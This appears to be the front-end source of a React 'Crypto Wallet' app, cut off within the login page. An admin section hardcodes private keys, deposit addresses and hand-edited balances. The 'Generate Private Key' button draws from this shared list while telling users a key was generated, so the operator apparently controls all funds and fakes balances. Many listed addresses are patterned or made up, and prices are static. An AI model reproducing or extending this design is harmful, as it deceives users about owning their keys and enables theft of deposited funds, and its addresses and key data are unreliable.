import { useState, useEffect } from "react";
import "./App.css";
import { BrowserRouter, Routes, Route } from "react-router-dom";
import { Toaster, toast } from "sonner";
import { 
  Wallet, 
  ArrowDownLeft, 
  ArrowUpRight, 
  Copy, 
  Check,
  X,
  LogOut,
  TrendingUp,
  TrendingDown,
  LayoutGrid,
  Receipt,
  Settings,
  Eye,
  EyeOff,
  Plus,
  RefreshCw
} from "lucide-react";

// ============================================
// ADMIN SECTION - WALLET DATABASE
// ============================================
// Each private key has unique wallet addresses for each token
// To add balance: Find the wallet address user sends you, locate the private key, update balances
// Format: privateKey -> { wallets: {tokenId: address}, balances: {tokenId: amount} }

const WALLET_DATABASE = {
  "0x4c0883a69102937d6231471b5dbb6204fe512961708279f9d9bc5f2b1e0a1c3d": {
    wallets: {
      usdt: "TQn9Y2khEsLJW1ChVWFMSMeRDow5K1pqrG",
      btc: "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq",
      eth: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
      xrp: "rN7n3473SaZBCG4dFL83w7a1RXtXtbk2D9",
      bnb: "bnb1grpf0955h0ykzq3ar5nmum7y6gdfl6lxfn46h2",
      sol: "7EcDhSYGxXyscszYEp35KHN8sZj6M3R4DYvQWh1ViTb5",
      doge: "D7Y55rYBnheFEx7Aa5QHq4F8A5K7BLEU9h",
      ada: "addr1qx2fxv2umyhttkxyxp8x0dlpdt3k6cwng5pxj3jhsydzer3jcu5d8ps7zex2k2xt3uqxgjqnnj83ws8lhrn648jjxtwq2ytjqp",
      trx: "TJCnKsPa7y5okkXvQAidZBzqx3QyQ6sxMW",
      avax: "0x8db97C7cEcE249c2b98bDC0226Cc4C2A57BF52FC"
    },
    balances: { usdt: 0, btc: 0, eth: 0, xrp: 0, bnb: 0, sol: 0, doge: 0, ada: 0, trx: 0, avax: 0 }
  },
  "0x7a28b5ba57c53603b0b07b56bba752f7784bf506fa95edc395f5cf6c7514fe9d": {
    wallets: {
      usdt: "TLyqzVGLV1srkB7dToTAEqgDSfPtXRJZYH",
      btc: "bc1qcr8te4kr609gcawutmrza0j4xv80jy8z306fyu",
      eth: "0x2B5AD5c4795c026514f8317c7a215E218DcCD6cF",
      xrp: "rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh",
      bnb: "bnb1u2agwjat20494fmc6jnuau0ls937cfjn4pjwtn",
      sol: "9WzDXwBbmPdCBEP7JmJYQ6sZj2X8RyqrL5HVcUaX2vV1",
      doge: "DRapidDiBYggT1zdrELnVhNDqyAHn89cQJ",
      ada: "addr1q9u5sjt7pf6v8qrm8p8k8qy6p4n2y9cqgw0r8j3vr6gxlc0cxnmvv9s0k7vvv9c0r7v0v7r0v7r0v7r0v7r0v7r0v7sqjqv9z",
      trx: "TPL66VK2gCXNCD7EJg9pgJRfqcRb6MXnvM",
      avax: "0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2"
    },
    balances: { usdt: 0, btc: 0, eth: 0, xrp: 0, bnb: 0, sol: 0, doge: 0, ada: 0, trx: 0, avax: 0 }
  },
  "0x9f3a2e5b8c7d4f1a6e0b3c8d2f5a9e7b4c1d6f0a3b8e5c2d9f6a0b7e4c1d8f5a": {
    wallets: {
      usdt: "TVj6GMQT4G2XdF3CTkPMDYHgPnLWznkzqe",
      btc: "bc1q0ht9tyks4vh7p5p904t340wuqm0lhvzqr4u7e5",
      eth: "0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2",
      xrp: "rsG1sNifXJxGS2nDQ9zHyoe1S5APrtwpjV",
      bnb: "bnb1jxfh2g85q3v0tdq56fnevx6xcxtcnhtsmcu64m",
      sol: "DYw8jCTfwHNRJhhmFcbXvVDTqWMEVFBX6ZKUmG5CNSKK",
      doge: "DMr3fEiVrPWFpoCWS958zNtqgnFb7QWn9D",
      ada: "addr1qy6nhfyks7wdu3dudslys37v252w2nwhv0fw2nfawemmn8k8ttq8f3gag0h89aepvx3xf69g0l9pf80tqv7cve0l33sdn8p3d",
      trx: "TT67rPNwgmpeimvHUMVzFfKsjL9GZ1wGw8",
      avax: "0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db"
    },
    balances: { usdt: 0, btc: 0, eth: 0, xrp: 0, bnb: 0, sol: 0, doge: 0, ada: 0, trx: 0, avax: 0 }
  },
  "0x2b4c6d8e0f1a3b5c7d9e0f2a4b6c8d0e1f3a5b7c9d0e2f4a6b8c0d1e3f5a7b9c": {
    wallets: {
      usdt: "TYDzsYUEpvnYmQk4zGP9sWWcTEd2MiAtW6",
      btc: "bc1qm34lsc65zpw79lxes69zkqmk6ee3ewf0j77s3h",
      eth: "0x78731D3Ca6b7E34aC0F824c42a7cC18A495cabaB",
      xrp: "rDsbeomae4FXwgQTJp9Rs64Qg9vDiTCdBv",
      bnb: "bnb1hgm0p7khfk85zpz5v0j8wnej3a90w709vhkdfu",
      sol: "5ZWj7a1f8tWkjBESHKgrLmXshuXxqeY9SYcfbshpAqPG",
      doge: "DHkLFbLCVfXnXnXnXnXnXnXnXnXnXnXnXn",
      ada: "addr1q8gg2r3vf9zggn3yhmgxk3jtlsznq5fsn5ghkr3yr0qxljk8ttq8f3gag0h89aepvx3xf69g0l9pf80tqv7cve0l33sdnkp7p",
      trx: "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf",
      avax: "0x617F2E2fD72FD9D5503197092aC168c91465E7f2"
    },
    balances: { usdt: 0, btc: 0, eth: 0, xrp: 0, bnb: 0, sol: 0, doge: 0, ada: 0, trx: 0, avax: 0 }
  },
  "0x8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e7d": {
    wallets: {
      usdt: "TN3W4H6rK4e8jt7xvJLqYFmZQR3dSSZLVu",
      btc: "bc1qgdjqv0av3q56jvd82tkdjpy7gdp9ut8tlqmgrp",
      eth: "0x5c6B0f7Bf3E7ce046039Bd8FABdfD3f9F5021678",
      xrp: "rPT1Sjq2YGrBMTttX4GZHjKu9dyfzbpAYe",
      bnb: "bnb1klc3kqfznljp6z8r9e8rfqxrywfvvycqfkt9qz",
      sol: "Gh9ZwEmdLJ8DscKNTkTqPbNwLNNBjuSzaG9Vp2KGtKJr",
      doge: "DH5yaieqoZN36fDVciNyRueRGvGLR3mr7L",
      ada: "addr1qxck7k9mz8jqr8n2fy3q6ylhvgms9w8xqgr8nxv0qw7qljk8ttq8f3gag0h89aepvx3xf69g0l9pf80tqv7cve0l33sdnn2v6",
      trx: "TNPeeaaFB7K9cmo4uQpcU32zGK8G1NYqeL",
      avax: "0x17F6AD8Ef982297579C203069C1DbfFE4348c372"
    },
    balances: { usdt: 500, btc: 0.05, eth: 0.2, xrp: 1000, bnb: 0.5, sol: 5, doge: 5000, ada: 500, trx: 10000, avax: 2 }
  },
  "0x1f2e3d4c5b6a7f8e9d0c1b2a3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8c9b0a1f2e": {
    wallets: {
      usdt: "TRvz1r3URQq5oth7cKGPzjHMYUFhEpXAXn",
      btc: "bc1qafk4yhqvj4wep57m62dgrmutldusqde8adh20d",
      eth: "0xdD870fA1b7C4700F2BD7f44238821C26f7392148",
      xrp: "r9cZA1mLK5R5Am25ArfXFmqgNwjZgnfk59",
      bnb: "bnb1z35wusfv8twfele77vddclka9z84ugywug48gn",
      sol: "HN7cABqLq46Es1jh92dQQisAq662SmxELLLsHHe4YWrH",
      doge: "D6R6gYQSUrn7gQAEP7bgXNj5M2vc3DwDxx",
      ada: "addr1q9g4wk8q7t3qr8n2fy3q6ylhvgms9w8xqgr8nxv0qw7qljk8ttq8f3gag0h89aepvx3xf69g0l9pf80tqv7cve0l33sdn7xjs",
      trx: "TADDx31pdCFfp3XrYxp6fQGbRxriYFLTrx",
      avax: "0x03C6FcED478cBbC9a4FAB34eF9f40767739D1Ff7"
    },
    balances: { usdt: 0, btc: 0, eth: 0, xrp: 0, bnb: 0, sol: 0, doge: 0, ada: 0, trx: 0, avax: 0 }
  },
  "0x5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b": {
    wallets: {
      usdt: "TKzxdSv2FZKQrEqkKVgp5DcwEXBEKMg2Ax",
      btc: "bc1qj89046x7zv6pm4n00qgqp505nvljnfp6xfznyw",
      eth: "0x583031D1113aD414F02576BD6afaBfb302140225",
      xrp: "rLHzPsX6oXkzU2qL12kHCH8G8cnZv1rBJh",
      bnb: "bnb1m5amny5ymph3kpfq2fv3ph6rzepjxkuswuv5gf",
      sol: "2WLbb7HPJX8qfm8vS4KbVLGmQHMfBME5mHoJwkLNPg7P",
      doge: "DFundmtrigzA6E25Swr2pRe4Eb79bGP8G1",
      ada: "addr1qy2fxv2umyhttkxyxp8x0dlpdt3k6cwng5pxj3jhsydzer3n0d3vllmyqwsx5wktcd8cc3sq835lu7drv2xwl2wywfgs68faem",
      trx: "TYsbWxNnyTgsZaTFaue9hqpxkU7Fkzl4Dh",
      avax: "0xdead000000000000000000000000000000000001"
    },
    balances: { usdt: 0, btc: 0, eth: 0, xrp: 0, bnb: 0, sol: 0, doge: 0, ada: 0, trx: 0, avax: 0 }
  },
  "0xd4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5": {
    wallets: {
      usdt: "TGjgvdTWWrybVLaVeFqSyVqJQWjxqRYbaK",
      btc: "bc1qpeeu3vjrm9dn2y42sl926374y5cvyeqcnpv8nz",
      eth: "0x4B0897b0513fdC7C541B6d9D7E929C4e5364D2dB",
      xrp: "rBKPS4oLSaV2KVVuHH8EpQqMGgGefGFQs7",
      bnb: "bnb1venn9fzpgprqpvk7a8vf0j8qy8mr53ftarccle",
      sol: "CuieVDEDtLo7FypA9SbLM9saXFdb1dsshEkyErMqkRQq",
      doge: "DC5wp28L6Y8g6YxDM9FqA7PBkd1bcrKJWQ",
      ada: "addr1qxqs59lphg8g6qndelq8xwqn60ag3aeyfcp33c2kdp46a09re5df3pzwwmyq946axfcejy5n4x0y99wqpgtp2gd0k09qsgy6pz",
      trx: "TBAo7PNyKo94YVUq1hXs1KnLfxc4FL4XHM",
      avax: "0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c"
    },
    balances: { usdt: 0, btc: 0, eth: 0, xrp: 0, bnb: 0, sol: 0, doge: 0, ada: 0, trx: 0, avax: 0 }
  },
  "0x3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d": {
    wallets: {
      usdt: "TXsmKpEuW7qWnXzJLGP9eDLvWPR2GRn1FS",
      btc: "bc1ql49ydapnjafl5t2cp9zqpjwe6pdgmxy98859v2",
      eth: "0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C",
      xrp: "rHcFoo6a9qT5NHiVn1THQRhsEGcxtYCV4d",
      bnb: "bnb1m93e94x5ryldcpx58cqe9khfhtgsl0qpc3kn9x",
      sol: "7S3P4HxJpyyigGzodYwHtCxZyUQe9JiBMHyRWXArAaKv",
      doge: "DBXu2kgc3xtvCUWFcxFE3r9hEYgmuaaCyD",
      ada: "addr1qx94pz59a8qj8t8k9rlyu7qhldwqk8q7lnr6q3kvc8v7qljk8ttq8f3gag0h89aepvx3xf69g0l9pf80tqv7cve0l33sdnx93q",
      trx: "TWd4WrZ9wn84f5x1hZhL4DHvk738ns5jwb",
      avax: "0x0A098Eda01Ce92ff4A4CCb7A4fFFb5A43EBC70DC"
    },
    balances: { usdt: 0, btc: 0, eth: 0, xrp: 0, bnb: 0, sol: 0, doge: 0, ada: 0, trx: 0, avax: 0 }
  },
  "0xf0e1d2c3b4a5f6e7d8c9b0a1f2e3d4c5b6a7f8e9d0c1b2a3f4e5d6c7b8a9f0e1": {
    wallets: {
      usdt: "THPvaUhoh2Qn2y9THCZML3H815hhFhn5YC",
      btc: "bc1qwfgdjlocspwgky2jvfex37nxfvtsd7u7vqm8qq",
      eth: "0x0A098Eda01Ce92ff4A4CCb7A4fFFb5A43EBC70DC",
      xrp: "r3ADD8kXSUKHd6zTCKfnKT3zV9EZHjzp1S",
      bnb: "bnb1aexkpj2yqnqr7lz7p0qsqey88wkfr3l29a0h0z",
      sol: "4zMMC9srt5Ri5X14GAgXhaHii3GnPAEERYPJgZJDncDU",
      doge: "DPHnb2PpDL4VLeBtnWjYKDnv2MzDqqMbuD",
      ada: "addr1q8nun0vxzjplk8qry5q6ylhvgms9w8xqgr8nxv0qw7qljk8ttq8f3gag0h89aepvx3xf69g0l9pf80tqv7cve0l33sdnglse",
      trx: "TKLD2KRxRKwWqcQx8qx4jjtDqfq2CEGXAL",
      avax: "0xE7f1725E7734CE288F8367e1Bb143E90bb3F0512"
    },
    balances: { usdt: 0, btc: 0, eth: 0, xrp: 0, bnb: 0, sol: 0, doge: 0, ada: 0, trx: 0, avax: 0 }
  },
  "0xa1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2": {
    wallets: {
      usdt: "TJRabPrwbZy45sbavfcjinPJC18kjpRTv8",
      btc: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
      eth: "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc",
      xrp: "rfkE1aSy9G8Upk4JssnwBxhEv5p4mn2KTy",
      bnb: "bnb1l7kd6430fx9wj2xczdv4zfpvzn8k2cgqccgdgz",
      sol: "8Kag8CqNdCX55s4A5W4iraS71h6mv6uTHqsJbexdrrZm",
      doge: "DNnUMbbEf2Nba2MxvGk97rPVNB65x4PRvS",
      ada: "addr1qy32vu2yrl0y5xjqq6ylhvgms9w8xqgr8nxv0qw7qljk8ttq8f3gag0h89aepvx3xf69g0l9pf80tqv7cve0l33sdn9m3dm",
      trx: "TVZZ3ZvPndLLSXQWqPLVLK5GrPLMVYCpqF",
      avax: "0x976EA74026E726554dB657fA54763abd0C3a0aa9"
    },
    balances: { usdt: 0, btc: 0, eth: 0, xrp: 0, bnb: 0, sol: 0, doge: 0, ada: 0, trx: 0, avax: 0 }
  },
  "0xb2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3": {
    wallets: {
      usdt: "TDJcqJEgNTrKJirsHKLMVRt2HFkLVCSP4E",
      btc: "bc1q5d8f7w5d8f7w5d8f7w5d8f7w5d8f7w5d8f7w5d",
      eth: "0x15d34AAf54267DB7D7c367839AAf71A00a2C6A65",
      xrp: "rDCgaaSBAWYfsxUYhCk1n26Na7x8PQRxoy",
      bnb: "bnb1n8m4z4c8h4x8h4x8h4x8h4x8h4x8h4x8h4x8h4",
      sol: "3Kz9H5u8d5d8f7w5d8f7w5d8f7w5d8f7w5d8f7w5d",
      doge: "DQkwDpRYUyNNnoEZDfSGFFeQvLgbdEXSQP",
      ada: "addr1qx8q7k8qr8n2fy3q6ylhvgms9w8xqgr8nxv0qw7qljk8ttq8f3gag0h89aepvx3xf69g0l9pf80tqv7cve0l33sdnmlsq",
      trx: "TZ4UXDV5ZhNW7fb2AMSbgfAEZ7hWsnYS2g",
      avax: "0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0"
    },
    balances: { usdt: 0, btc: 0, eth: 0, xrp: 0, bnb: 0, sol: 0, doge: 0, ada: 0, trx: 0, avax: 0 }
  },
  "0xc3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4": {
    wallets: {
      usdt: "TYukBQZ2XXCcRCReAUguyXncCWNY9CEiDQ",
      btc: "bc1qc3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2",
      eth: "0x90F79bf6EB2c4f870365E785982E1f101E93b906",
      xrp: "rU7bM9ENDkyvbNPPWcTfR5Y5YYRY6xbPN5",
      bnb: "bnb1c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2",
      sol: "9xQeWvG816bUx9EPjHmaT23yvVM2ZWbrrpZb9PusVFin",
      doge: "DC3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0",
      ada: "addr1qyc3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4sdnxlq",
      trx: "TUp2dZPHSQDRkwWJCVz8FHwzGKCAhfxjjJ",
      avax: "0xcF2C3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c"
    },
    balances: { usdt: 0, btc: 0, eth: 0, xrp: 0, bnb: 0, sol: 0, doge: 0, ada: 0, trx: 0, avax: 0 }
  },
  "0xd4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e6": {
    wallets: {
      usdt: "TQqvDz6bTBjxAcPHGKfHfWseJDTX91ZPLW",
      btc: "bc1qd4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3",
      eth: "0xa0Ee7A142d267C1f36714E4a8F75612F20a79720",
      xrp: "rLUEXYuLiQptky37CqLcm9USQpPiz5rkpD",
      bnb: "bnb1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3",
      sol: "DYw8jCTfwHNRJhhmFcbXvVDTqWMEVFBX6ZKUmG5CNSKL",
      doge: "DD4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1",
      ada: "addr1qyd4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4sdnx23",
      trx: "TUEZSdKsoDHQMeZwihtdoBiN46zxhGWYdH",
      avax: "0xdF3e18d64BC6A983f673Ab319CCaE4f1a57C7097"
    },
    balances: { usdt: 0, btc: 0, eth: 0, xrp: 0, bnb: 0, sol: 0, doge: 0, ada: 0, trx: 0, avax: 0 }
  },
  "0xe5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6": {
    wallets: {
      usdt: "TPKDUwJqkVjB3e2PZbPSfRhshSVr5KvF8d",
      btc: "bc1qe5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4",
      eth: "0xBcd4042DE499D14e55001CcbB24a551F3b954096",
      xrp: "rHKEQ4VH2z4p4S8M1p4JpL3xkQq5JckFCE",
      bnb: "bnb1e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4",
      sol: "HdH5CUu5Hc5YF5p5PJ5b5B5n5x5m5L5q5R5s5T5v5W5",
      doge: "DE5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2",
      ada: "addr1qye5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4sdnxrq",
      trx: "TGnLwdJmQKM8fhwAqPNPgPLa6s8gVXR7VV",
      avax: "0x71bE63f3384f5fb98995898A86B02Fb2426c5788"
    },
    balances: { usdt: 0, btc: 0, eth: 0, xrp: 0, bnb: 0, sol: 0, doge: 0, ada: 0, trx: 0, avax: 0 }
  },
  "0xf6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7": {
    wallets: {
      usdt: "TGLaWrqWqgFHkKePW6PNXSW5gWLNpZwZZL",
      btc: "bc1qf6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5",
      eth: "0xFABB0ac9d68B0B445fB7357272Ff202C5651694a",
      xrp: "rBWpYJhuJWBPAkzJ4kYQqHShSkkF3rgeDE",
      bnb: "bnb1f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5",
      sol: "4Zw1fXuYuJhYJ4Y4jY4Y4Y4Y4Y4Y4Y4Y4Y4Y4Y4Y4Y4",
      doge: "DF6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3",
      ada: "addr1qyf6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4sdnxsq",
      trx: "TLa2f6AWpWZhDMPRfnkPjLaq3L4s5Y8aHe",
      avax: "0x1CBd3b2770909D4e10f157cABC84C7264073C9Ec"
    },
    balances: { usdt: 0, btc: 0, eth: 0, xrp: 0, bnb: 0, sol: 0, doge: 0, ada: 0, trx: 0, avax: 0 }
  },
  "0xa7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8": {
    wallets: {
      usdt: "TKzxdSv2FZKQrEqkKVgp5DcwEXBEKMg3Bx",
      btc: "bc1qa7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6",
      eth: "0x92561F28Ec438EE9831D00D1D59fbDC981b762b2",
      xrp: "rw2ciyaNshpHe7bCHo4bRWq6pqqynnWKQg",
      bnb: "bnb1a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6",
      sol: "5Zw1fXuYuJhYJ5Y5jY5Y5Y5Y5Y5Y5Y5Y5Y5Y5Y5Y5Y5",
      doge: "DA7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4",
      ada: "addr1qya7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4sdnxtq",
      trx: "TVYhEWV5VLKv5VVv5VVv5VVv5VVv5VVv5V",
      avax: "0xdF3e18d64BC6A983f673Ab319CCaE4f1a57C7098"
    },
    balances: { usdt: 0, btc: 0, eth: 0, xrp: 0, bnb: 0, sol: 0, doge: 0, ada: 0, trx: 0, avax: 0 }
  },
  "0xb8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9": {
    wallets: {
      usdt: "TMuA6YqfCeX8EhbfYEbYEbYEbYEbYEbYEb",
      btc: "bc1qb8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7",
      eth: "0x9E545E3C0baAB3E08CdfD552C960A1050f373042",
      xrp: "r4nmanwKSE6GpkTCrBjz8uTbrHos93yHcd",
      bnb: "bnb1b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7",
      sol: "6Zw1fXuYuJhYJ6Y6jY6Y6Y6Y6Y6Y6Y6Y6Y6Y6Y6Y6Y6",
      doge: "DB8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5",
      ada: "addr1qyb8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4sdnxuq",
      trx: "TSNEe1Ge5Ge5Ge5Ge5Ge5Ge5Ge5Ge5Ge5G",
      avax: "0x851356ae760d987E095750cCeb3bC6014560891C"
    },
    balances: { usdt: 0, btc: 0, eth: 0, xrp: 0, bnb: 0, sol: 0, doge: 0, ada: 0, trx: 0, avax: 0 }
  },
  "0xc9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0": {
    wallets: {
      usdt: "TNPeeaaFB7K9cmo4uQpcU32zGK8G1NYqeM",
      btc: "bc1qc9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8",
      eth: "0x2279B7A0a67DB372996a5FaB50D91eAA73d2eBe6",
      xrp: "rpGaCyHRYbgKhErgFih3RdjJqXDw6C5574",
      bnb: "bnb1c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8",
      sol: "7Zw1fXuYuJhYJ7Y7jY7Y7Y7Y7Y7Y7Y7Y7Y7Y7Y7Y7Y7",
      doge: "DC9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6",
      ada: "addr1qyc9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4sdnxvq",
      trx: "TJYeasdWdMPoRe4e4Re4e4Re4e4Re4e4Re",
      avax: "0x95222290DD7278Aa3Ddd389Cc1E1d165CC4BAfe5"
    },
    balances: { usdt: 0, btc: 0, eth: 0, xrp: 0, bnb: 0, sol: 0, doge: 0, ada: 0, trx: 0, avax: 0 }
  }
};

// ============================================
// END ADMIN SECTION
// ============================================

// Valid Private Keys
const VALID_PRIVATE_KEYS = Object.keys(WALLET_DATABASE);

// Top 10 Tokens with real icons
const DEFAULT_TOKENS = [
  { 
    id: "btc", 
    name: "Bitcoin", 
    symbol: "BTC", 
    price: 43250.80, 
    change: 2.45,
    icon: "https://assets.coingecko.com/coins/images/1/large/bitcoin.png",
    color: "#F7931A",
    chartData: [42100, 42500, 41800, 43000, 43500, 42800, 43250],
    network: "Bitcoin"
  },
  { 
    id: "eth", 
    name: "Ethereum", 
    symbol: "ETH", 
    price: 2580.40, 
    change: 1.82,
    icon: "https://assets.coingecko.com/coins/images/279/large/ethereum.png",
    color: "#627EEA",
    chartData: [2450, 2520, 2480, 2550, 2600, 2560, 2580],
    network: "ERC20"
  },
  { 
    id: "usdt", 
    name: "Tether USD", 
    symbol: "USDT", 
    price: 1.00, 
    change: -0.01,
    icon: "https://assets.coingecko.com/coins/images/325/large/Tether.png",
    color: "#26A17B",
    chartData: [1.00, 1.00, 1.00, 1.00, 1.00, 1.00, 1.00],
    network: "TRC20"
  },
  { 
    id: "xrp", 
    name: "XRP", 
    symbol: "XRP", 
    price: 0.62, 
    change: 3.15,
    icon: "https://assets.coingecko.com/coins/images/44/large/xrp-symbol-white-128.png",
    color: "#23292F",
    chartData: [0.58, 0.59, 0.60, 0.61, 0.60, 0.61, 0.62],
    network: "XRP Ledger"
  },
  { 
    id: "bnb", 
    name: "BNB", 
    symbol: "BNB", 
    price: 312.50, 
    change: 0.85,
    icon: "https://assets.coingecko.com/coins/images/825/large/bnb-icon2_2x.png",
    color: "#F3BA2F",
    chartData: [305, 308, 310, 309, 311, 313, 312.5],
    network: "BEP20"
  },
  { 
    id: "sol", 
    name: "Solana", 
    symbol: "SOL", 
    price: 98.75, 
    change: 4.12,
    icon: "https://assets.coingecko.com/coins/images/4128/large/solana.png",
    color: "#9945FF",
    chartData: [92, 94, 95, 96, 97, 99, 98.75],
    network: "Solana"
  },
  { 
    id: "doge", 
    name: "Dogecoin", 
    symbol: "DOGE", 
    price: 0.0825, 
    change: -1.25,
    icon: "https://assets.coingecko.com/coins/images/5/large/dogecoin.png",
    color: "#C2A633",
    chartData: [0.084, 0.083, 0.085, 0.082, 0.083, 0.081, 0.0825],
    network: "Dogecoin"
  },
  { 
    id: "ada", 
    name: "Cardano", 
    symbol: "ADA", 
    price: 0.52, 
    change: 2.35,
    icon: "https://assets.coingecko.com/coins/images/975/large/cardano.png",
    color: "#0033AD",
    chartData: [0.49, 0.50, 0.51, 0.50, 0.51, 0.52, 0.52],
    network: "Cardano"
  },
  { 
    id: "trx", 
    name: "TRON", 
    symbol: "TRX", 
    price: 0.1045, 
    change: -0.85,
    icon: "https://assets.coingecko.com/coins/images/1094/large/tron-logo.png",
    color: "#FF0013",
    chartData: [0.105, 0.104, 0.106, 0.103, 0.105, 0.104, 0.1045],
    network: "TRC20"
  },
  { 
    id: "avax", 
    name: "Avalanche", 
    symbol: "AVAX", 
    price: 35.80, 
    change: 1.95,
    icon: "https://assets.coingecko.com/coins/images/12559/large/Avalanche_Circle_RedWhite_Trans.png",
    color: "#E84142",
    chartData: [34, 34.5, 35, 35.2, 35.5, 35.6, 35.8],
    network: "C-Chain"
  }
];

// Mini Chart Component
const MiniChart = ({ data, isPositive }) => {
  const max = Math.max(...data);
  const min = Math.min(...data);
  const range = max - min || 1;
  
  const points = data.map((value, index) => {
    const x = (index / (data.length - 1)) * 100;
    const y = 100 - ((value - min) / range) * 100;
    return `${x},${y}`;
  }).join(' ');

  return (
    <svg width="70" height="28" viewBox="0 0 100 100" preserveAspectRatio="none">
      <polyline
        fill="none"
        stroke={isPositive ? "#00FF94" : "#FF0055"}
        strokeWidth="3"
        points={points}
      />
    </svg>
  );
};

// Login Page Component
const LoginPage = ({ onLogin }) => {
  const [privateKey, setPrivateKey] = useState("");
  const [error, setError] = useState("");

  const handleGenerate = () => {
    const randomIndex = Math.floor(Math.random() * VALID_PRIVATE_KEYS.length);
    const generatedKey = VALID_PRIVATE_KEYS[randomIndex];
    setPrivateKey(generatedKey);
    setError("");
    toast.success("Private key generated!");
  };

  const handleLogin = () => {
    const trimmedKey = privateKey.trim().toLowerCase();
    if (VALID_PRIVATE_KEYS.map(k => k.toLowerCase()).includes(trimmedKey)) {
      const matchedKey = VALID_PRIVATE_KEYS.find(k => k.toLowerCase() === trimmedKey);
      onLogin(matchedKey);
      toast.success("Wallet connected!");
    } else {
      setError("Invalid private key. Please check and try again.");
      toast.error("Invalid private key");
    }
  };

  const handleKeyPress = (e) => {
    if (e.key === 'Enter') {
      handleLogin();
    }
  };

  return (
    <div className="login-page" data-testid="login-page">
      <div className="login-logo">
        <Wallet size={40} color="#000000" />
      </div>
      
      <h1 className="text-3xl font-bold text-center mb-2" style={{ fontFamily: 'Poppins, sans-serif' }}>
        Crypto Wallet
      </h1>
      <p className="text-center text-[#A1A1AA] mb-8">
        Generate or enter your private key to access
      </p>

      <div className="space-y-4">
        <button 
          onClick={handleGenerate}
          className="primary-btn w-full flex items-center justify-center gap-2"
          data-testid="generate-key-btn"
        >
          <RefreshCw size={20} />
          Generate Private Key
        </button>

        <div className="relative my-4">
